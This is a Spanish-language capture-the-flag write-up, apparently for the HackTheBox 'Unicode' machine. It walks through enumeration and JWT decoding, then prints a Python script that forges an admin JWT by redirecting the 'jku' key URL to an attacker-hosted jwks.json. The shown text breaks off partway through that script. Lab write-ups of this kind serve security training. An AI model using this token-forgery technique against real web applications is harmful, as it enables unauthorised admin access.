<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Unicode" /><meta property="og:locale" content="en" /><meta name="description" content="Enumerando encontramos un servicio web en el cuál podemos iniciar una sesión y obtener una cookie en formato JSON Web Token (JWT) con el campo JKU expuesto que permite crearnos una cookie para entrar como administrador. Existe un apartado vulnerable a Local File Inclusion (LFI) que nos permite enumerar archivos de configuración del servidor Nginx y obtener credenciales de un usuario para entrar por el protocolo Secure Shell (SSH). Para la escalada de privilegios logramos la authorización de nuestro par de llaves de autenticación por medio de la herramienta curl, que era parte de un binario que podiamos ejecutar como root." /><meta property="og:description" content="Enumerando encontramos un servicio web en el cuál podemos iniciar una sesión y obtener una cookie en formato JSON Web Token (JWT) con el campo JKU expuesto que permite crearnos una cookie para entrar como administrador. Existe un apartado vulnerable a Local File Inclusion (LFI) que nos permite enumerar archivos de configuración del servidor Nginx y obtener credenciales de un usuario para entrar por el protocolo Secure Shell (SSH). Para la escalada de privilegios logramos la authorización de nuestro par de llaves de autenticación por medio de la herramienta curl, que era parte de un binario que podiamos ejecutar como root." /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBUnicode/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBUnicode/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-04T01:13:59-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Unicode" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-04T01:13:59-05:00","datePublished":"2022-03-04T01:13:59-05:00","description":"Enumerando encontramos un servicio web en el cuál podemos iniciar una sesión y obtener una cookie en formato JSON Web Token (JWT) con el campo JKU expuesto que permite crearnos una cookie para entrar como administrador. Existe un apartado vulnerable a Local File Inclusion (LFI) que nos permite enumerar archivos de configuración del servidor Nginx y obtener credenciales de un usuario para entrar por el protocolo Secure Shell (SSH). Para la escalada de privilegios logramos la authorización de nuestro par de llaves de autenticación por medio de la herramienta curl, que era parte de un binario que podiamos ejecutar como root.","headline":"Hackthebox Writeup Unicode","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBUnicode/"},"url":"https://e1p0tr0.github.io/posts/HTBUnicode/"}</script><title>Hackthebox Writeup Unicode | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Unicode</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Unicode</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guillén</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1646374439" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-04 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1826 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><p>Enumerando encontramos un servicio web en el cuál podemos iniciar una sesión y obtener una cookie en formato <strong>JSON Web Token (JWT)</strong> con el campo <strong>JKU</strong> expuesto que permite crearnos una cookie para entrar como administrador. Existe un apartado vulnerable a <strong>Local File Inclusion (LFI)</strong> que nos permite enumerar archivos de configuración del servidor <strong>Nginx</strong> y obtener credenciales de un usuario para entrar por el protocolo <strong>Secure Shell (SSH)</strong>. Para la escalada de privilegios logramos la authorización de nuestro par de llaves de autenticación por medio de la herramienta <strong>curl</strong>, que era parte de un binario que podiamos ejecutar como root.</p><hr /><p><img data-src="/assets/img/htb/writeups/unicode/unicode_logo.png" alt="Unicode" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.126<td style="text-align: center">27 Nov 2021<td style="text-align: center">Medium<td style="text-align: center">30</table></div><hr /><p>Antes de empezar la máquina es importante revisar si tenemos conexión con ella, para ello usamos el comando <code class="language-plaintext highlighter-rouge">ping</code>:</p><p><img data-src="/assets/img/htb/writeups/unicode/connection_ping.png" alt="Ping" class="shadow" data-proofer-ignore></p><blockquote><p>Explicación de parámetros:</p><p>-c &lt;count&gt; : Número de paquetes ICMP que deseamos enviar a la máquina</p></blockquote><blockquote class="prompt-tip"><div><p>Sistema Operativo por aprox. del <strong>TTL (Time To Live)</strong> : <em><code class="language-plaintext highlighter-rouge">64 -&gt; Linux | 128 -&gt; Windows</code></em></p></div></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Comenzamos escaneando los puertos <strong>TCP</strong> abiertos con la herramienta <code class="language-plaintext highlighter-rouge">nmap</code>:</p><p><img data-src="/assets/img/htb/writeups/unicode/enumeration_nmap.png" alt="Nmap" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>--open : Escanear solo puertos abiertos</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como mínimo</p><p>-v : Imprimir información del proceso del escaneo</p><p>-n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)</p><p>-oG &lt;file&gt; : Guardar output en un archivo (&lt;file&gt;) de formato <em>grepable</em></p></blockquote><p>Observamos que la máquina tiene abierto el puerto <strong>22 (ssh) y 80 (http)</strong>, asi que procedemos a escanear de manera específica cada uno de estos puertos:</p><p><img data-src="/assets/img/htb/writeups/unicode/enumeration_openPortsTCP.png" alt="OpenPortsTCP" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p&lt;port_1,port_2,...&gt; : Indicamos que puertos queremos escanear</p><p>-sC : Ejecutar en los puertos scripts por defecto de nmap</p><p>-sV : Activar detección de versiones de los servicios que corren por los puertos</p><p>-oN &lt;file&gt; : Guardar el output del escaneo en un archivo con formato Nmap</p></blockquote><p>Omitimos entrar por el puerto 22 ya que no disponemos de credenciales para entrar por SSH.</p><p>Observamos que hay un servicio http por el puerto 80, así que ejecutamos un <code class="language-plaintext highlighter-rouge">whatweb</code> para obtener un poco mas de información y por otro lado ingresamos a la página por el navegador</p><p><img data-src="/assets/img/htb/writeups/unicode/whatweb.png" alt="Whatweb" class="shadow" data-proofer-ignore></p><p>Toqueteando un poco encontramos un botón con una redirección a una URL específica, y secciones para registrarnos y logearnos:</p><p><img data-src="/assets/img/htb/writeups/unicode/home_page_http.png" alt="Htpp_home" class="shadow" data-proofer-ignore></p><p>Intentamos registrarnos:</p><p><img data-src="/assets/img/htb/writeups/unicode/register_page_http.png" alt="Htpp_register" class="shadow" data-proofer-ignore></p><p>Nos logeamos:</p><p><img data-src="/assets/img/htb/writeups/unicode/login_page_http.png" alt="Htpp_login" class="shadow" data-proofer-ignore></p><p>Y ya tenemos una sessión:</p><p><img data-src="/assets/img/htb/writeups/unicode/session_page_http.png" alt="Htpp_session" class="shadow" data-proofer-ignore></p><p>De primeras solo hay de interesante subir un archivo, lo cúal puede ser una brecha, pero intentando un poco no conseguimos nada.</p><p>Lo que sí, ayudandonos un poco del nombre de la máquina <strong>Unicode</strong>, y que tenemos una sesión, pues al observar la cookie de sesión vemos algo interesante:</p><p><img data-src="/assets/img/htb/writeups/unicode/session_cookie.png" alt="Http_session_cookie" class="shadow" data-proofer-ignore></p><p>Si conoces un poco de formatos sabras por la separación de <strong>puntos(.)</strong> de que se trata.</p><p>Si es la primera vez que miras una cookie así, lo que puedes hacer es intentar decodearla a un formato clásico, en este caso a <code class="language-plaintext highlighter-rouge">base64</code>:</p><p><img data-src="/assets/img/htb/writeups/unicode/session_cookie_decode.png" alt="Http_session_\decode" class="shadow" data-proofer-ignore></p><p>Logramos observar una estructura en formato <code class="language-plaintext highlighter-rouge">json</code> y vemos que en un campo especifica el tipo <code class="language-plaintext highlighter-rouge">JWT</code>, y averiguando un poco encontramos:</p><p><img data-src="/assets/img/htb/writeups/unicode/jwt_definition.png" alt="JWT" class="shadow" data-proofer-ignore></p><p>Ahora que ya tenemos una idea procedemos a decodear la cookie para ver mas información, usamos una página muy útil: <a href="https://jwt.io">https://jwt.io</a></p><p><img data-src="/assets/img/htb/writeups/unicode/jwt_io.png" alt="JWT_IO" class="shadow" data-proofer-ignore></p><p>Observamos en el campo <code class="language-plaintext highlighter-rouge">jku</code> un enlace al archivo <code class="language-plaintext highlighter-rouge">jwks.json</code>, primero averiguamos de que va para luego saber que vamos a encontrar:</p><p><img data-src="/assets/img/htb/writeups/unicode/jwt_jku_definition.png" alt="JWT_jku" class="shadow" data-proofer-ignore></p><p>Para ver el archivo necesitamos aplicar <strong>Virtual hosting</strong> agregando nombre de dominio <strong>hackmedia.htb</strong> a nuestro archivo <em>/etc/hosts</em>: <code class="language-plaintext highlighter-rouge">echo "10.10.11.126 hackmedia.htb" &gt;&gt; /etc/hosts</code></p><p>Una vez dentro observamos el contenido:</p><p><img data-src="/assets/img/htb/writeups/unicode/jwt_json.png" alt="JWT_json" class="shadow" data-proofer-ignore></p><p>Sabiendo todo esto, tendriamos una brecha para poder conseguir una <code class="language-plaintext highlighter-rouge">cookie de sessión</code> pero como <code class="language-plaintext highlighter-rouge">admin</code>.</p><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>El ataque consiste en crear token para logearnos como usuarios <code class="language-plaintext highlighter-rouge">admin</code>, para ello debemos hacer lo siguiente:</p><ol><li>Generamos un par de llaves para firmar nuestro token <code class="language-plaintext highlighter-rouge">keypair.pem</code><li>Descargamos el archivo <code class="language-plaintext highlighter-rouge">http://hackmedia/static/jwks.json</code><li>Extraemos de <code class="language-plaintext highlighter-rouge">keypair.pem</code> las llaves para validación y las asignamos al archivo <code class="language-plaintext highlighter-rouge">jwks.json</code><li>Generamos nuestro token con los campos correspondientes. Y un paso importante, usamos la redirección que tiene la página <code class="language-plaintext highlighter-rouge">href="/redirect/?url=google.com"</code><li>Reemplazamos en el campo <code class="language-plaintext highlighter-rouge">jku</code> para que apunte a nuestro archivo <code class="language-plaintext highlighter-rouge">jwks.json</code> y valide el token<li>Abrimos un servicio por un puerto para que pueda leerse el archivo <code class="language-plaintext highlighter-rouge">jwks.json</code><li>Asignamos la cookie a la página web, actualizamos, recibimos la peticioń en nuestro servicio en escucha y ya somos <code class="language-plaintext highlighter-rouge">admin</code></ol><p>Para agilizar el proceso hize un script en <code class="language-plaintext highlighter-rouge">python</code> el cúal pasando los parámetros <strong>IP-ATACANTE, PUERTO, COOKIE, IP-VÍCTIMA</strong> logra generarte el token del usuario <code class="language-plaintext highlighter-rouge">admin</code>, abrirte un servicio en el puerto especificado, para luego asignar la cookie a la web, actualizar y listo:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">pdb</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">jwt</span> <span class="k">as</span> <span class="n">jwt_header</span>
<span class="kn">from</span> <span class="nn">jwcrypto</span> <span class="kn">import</span> <span class="n">jwk</span> <span class="k">as</span> <span class="n">jwk_crypt</span><span class="p">,</span> <span class="n">jwt</span> <span class="k">as</span> <span class="n">jwt_crypt</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">cprint</span>
<span class="kn">import</span> <span class="nn">signal</span>

<span class="c1">#ctrl+c
</span><span class="k">def</span> <span class="nf">handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
    <span class="n">remove_files</span><span class="p">()</span>
    <span class="n">printRed</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[-] Exiting...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">handler</span><span class="p">)</span>

<span class="c1">#JWK packages
</span><span class="k">def</span> <span class="nf">requirements</span><span class="p">():</span>
    <span class="n">printRed</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">[!] Requirements!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">printGreen</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] pip install jwcrypto</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">printGreen</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] pip install PyJWT</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="c1">#colors
</span><span class="n">printRed</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">cprint</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">'red'</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">' '</span><span class="p">)</span>
<span class="n">printYellow</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">cprint</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">'yellow'</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">' '</span><span class="p">)</span>
<span class="n">printMagenta</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">cprint</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">'magenta'</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">' '</span><span class="p">)</span>
<span class="n">printGreen</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">cprint</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">'green'</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">' '</span><span class="p">)</span>

<span class="c1">#panel_help
</span><span class="k">def</span> <span class="nf">help</span><span class="p">():</span>
    <span class="n">printYellow</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[*] Uso : "</span><span class="p">)</span>
    <span class="n">printMagenta</span><span class="p">(</span><span class="sa">f</span><span class="s">"python3 </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;ip_address&gt; &lt;port&gt; &lt;cookie_session&gt;"</span><span class="p">)</span>
    <span class="n">requirements</span><span class="p">()</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  

<span class="c1">#valid_input
</span><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span> <span class="n">help</span><span class="p">()</span>

<span class="c1">#global variables
</span><span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="n">user_token</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>

<span class="c1">#create keys
</span><span class="k">def</span> <span class="nf">gen_key</span><span class="p">():</span>
    <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">([</span><span class="s">'openssl'</span><span class="p">,</span> <span class="s">'genrsa'</span><span class="p">,</span> <span class="s">'-out'</span><span class="p">,</span> <span class="s">'keypair.pem'</span><span class="p">,</span> <span class="s">'2048'</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">STDOUT</span><span class="p">)</span>

<span class="c1">#remove files 
</span><span class="k">def</span> <span class="nf">remove_files</span><span class="p">():</span>
    <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">([</span><span class="s">'rm'</span><span class="p">,</span> <span class="s">'keypair.pem'</span><span class="p">,</span> <span class="s">'jwks.json'</span><span class="p">])</span>

<span class="c1">#get header token
</span><span class="k">def</span> <span class="nf">get_headers</span><span class="p">():</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="n">jwt_header</span><span class="p">.</span><span class="n">get_unverified_header</span><span class="p">(</span><span class="n">user_token</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">headers</span>

<span class="c1">#decode user_token
</span><span class="k">def</span> <span class="nf">download_json</span><span class="p">():</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="n">get_headers</span><span class="p">()</span>
    <span class="n">jku</span> <span class="o">=</span> <span class="n">headers</span><span class="p">[</span><span class="s">'jku'</span><span class="p">]</span>
    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s">"wget </span><span class="si">{</span><span class="n">jku</span><span class="si">}</span><span class="s"> 2&gt;/dev/null"</span><span class="p">)</span>

<span class="c1">#create new json
</span><span class="k">def</span> <span class="nf">create_json</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"jwks.json"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">jsonfile</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">load</span><span class="p">(</span><span class="n">jsonfile</span><span class="p">)</span>
    <span class="n">data</span><span class="p">[</span><span class="s">'keys'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">'kid'</span><span class="p">]</span> <span class="o">=</span> <span class="n">key</span><span class="p">.</span><span class="n">kid</span>
    <span class="n">data</span><span class="p">[</span><span class="s">'keys'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">'n'</span><span class="p">]</span> <span class="o">=</span> <span class="n">key</span><span class="p">.</span><span class="n">n</span>
    <span class="n">data</span><span class="p">[</span><span class="s">'keys'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">'e'</span><span class="p">]</span> <span class="o">=</span> <span class="n">key</span><span class="p">.</span><span class="n">e</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"jwks.json"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">jsonfile</span><span class="p">:</span>
            <span class="n">json</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">jsonfile</span><span class="p">)</span>

<span class="c1">#get data token
</span><span class="k">def</span> <span class="nf">get_data_key</span><span class="p">():</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"keypair.pem"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">pemfile</span><span class="p">:</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">jwk_crypt</span><span class="p">.</span><span class="n">JWK</span><span class="p">.</span><span class="n">from_pem</span><span class="p">(</span><span class="n">pemfile</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
    <span class="k">return</span> <span class="n">key</span>

<span class="c1">#create token
</span><span class="k">def</span> <span class="nf">gen_token</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="n">get_headers</span><span class="p">()</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">jwt_crypt</span><span class="p">.</span><span class="n">JWT</span><span class="p">(</span>
                <span class="n">header</span> <span class="o">=</span> <span class="p">{</span>
                        <span class="s">"alg"</span> <span class="p">:</span> <span class="n">headers</span><span class="p">[</span><span class="s">'alg'</span><span class="p">],</span>
                        <span class="s">"jku"</span> <span class="p">:</span> <span class="sa">f</span><span class="s">"http://hackmedia.htb/static/../redirect/?url=</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">/jwks.json"</span>
                    <span class="p">},</span>
                <span class="n">claims</span> <span class="o">=</span> <span class="p">{</span>
                        <span class="s">"user"</span> <span class="p">:</span> <span class="s">"admin"</span>
                    <span class="p">}</span>
            <span class="p">)</span>
    <span class="n">token</span><span class="p">.</span><span class="n">make_signed_token</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">token</span><span class="p">.</span><span class="n">serialize</span><span class="p">()</span>
     
<span class="c1">#port sharing manually
</span><span class="k">def</span> <span class="nf">listen_port</span><span class="p">(</span><span class="n">port</span><span class="p">):</span>
    <span class="n">printYellow</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n\n</span><span class="s">[+] Opening port </span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s"> to share"</span><span class="p">)</span>
    <span class="n">printRed</span><span class="p">(</span><span class="s">"jwks.json"</span><span class="p">)</span>
    <span class="n">printYellow</span><span class="p">(</span><span class="s">"file..."</span><span class="p">)</span>
    <span class="n">printYellow</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Serving HTTP on 0.0.0.0 port </span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
